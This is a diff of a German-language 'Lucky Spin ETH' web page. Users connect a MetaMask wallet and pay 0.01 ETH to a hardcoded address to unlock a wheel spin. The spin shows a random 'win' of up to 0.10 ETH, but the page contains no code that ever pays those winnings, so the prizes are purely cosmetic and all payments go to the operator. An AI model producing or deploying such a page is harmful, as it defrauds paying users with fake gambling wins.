@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lucky Spin</title>
+  <title>Lucky Spin ETH</title>
   <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
 </head>
 <body>
   <div class="container">
@@ -12,13 +13,105 @@
     <button id="connectWallet">🔗 Wallet verbinden</button>
     <div id="walletAddress"></div>
 
+    <button id="payButton">💸 0.01 ETH bezahlen</button>
+    <div id="paymentStatus"></div>
+
     <div id="wheel" class="wheel">🌀</div>
-    <button id="spinButton">Jetzt drehen</button>
+    <button id="spinButton" disabled>Jetzt drehen</button>
 
     <div id="result"></div>
   </div>
 
-  <script src="wallet.js"></script>
-  <script src="script.js"></script>
+  <script>
+    let userAddress;
+
+    document.getElementById("connectWallet").addEventListener("click", async () => {
+      if (window.ethereum) {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        document.getElementById("walletAddress").innerText = `Verbunden: ${userAddress}`;
+      } else {
+        alert("MetaMask nicht gefunden.");
+      }
+    });
+
+    document.getElementById("payButton").addEventListener("click", async () => {
+      if (!userAddress) return alert("Bitte zuerst Wallet verbinden.");
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+
+      try {
+        const tx = await signer.sendTransaction({
+          to: "0x648b728D2A4F1De90036276951fc56d3dB1bE094", // deine ETH-Adresse
+          value: ethers.utils.parseEther("0.01")
+        });
+        document.getElementById("paymentStatus").innerText = "Zahlung gesendet. Warte auf Bestätigung...";
+        await tx.wait();
+        document.getElementById("paymentStatus").innerText = "Zahlung erfolgreich! Jetzt drehen!";
+        document.getElementById("spinButton").disabled = false;
+      } catch (err) {
+        document.getElementById("paymentStatus").innerText = "Zahlung fehlgeschlagen.";
+        console.error(err);
+      }
+    });
+
+    document.getElementById("spinButton").addEventListener("click", () => {
+      const results = ["💰 0.01 ETH", "😢 Leider nichts", "🎉 0.05 ETH", "⭐ 0.10 ETH"];
+      const wheel = document.getElementById("wheel");
+      wheel.style.animation = "spin 2s ease-out";
+      setTimeout(() => {
+        wheel.style.animation = "none";
+        const result = results[Math.floor(Math.random() * results.length)];
+        document.getElementById("result").innerText = `Dein Gewinn: ${result}`;
+      }, 2000);
+    });
+  </script>
+
+  <style>
+    body {
+      font-family: sans-serif;
+      background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
+      color: #fff;
+      text-align: center;
+      margin: 0;
+      padding: 2em;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 2em;
+      background-color: #222;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0, 255, 150, 0.3);
+    }
+    button {
+      background: #00ff99;
+      border: none;
+      padding: 0.8em 1.5em;
+      margin: 1em 0.3em;
+      border-radius: 12px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #00cc7a;
+    }
+    #wheel {
+      font-size: 100px;
+      margin: 20px 0;
+      transition: transform 2s ease-out;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(3600deg); }
+    }
+    #result, #paymentStatus {
+      margin-top: 1em;
+      font-weight: bold;
+    }
+  </style>
 </body>
-</html>c
+</html>
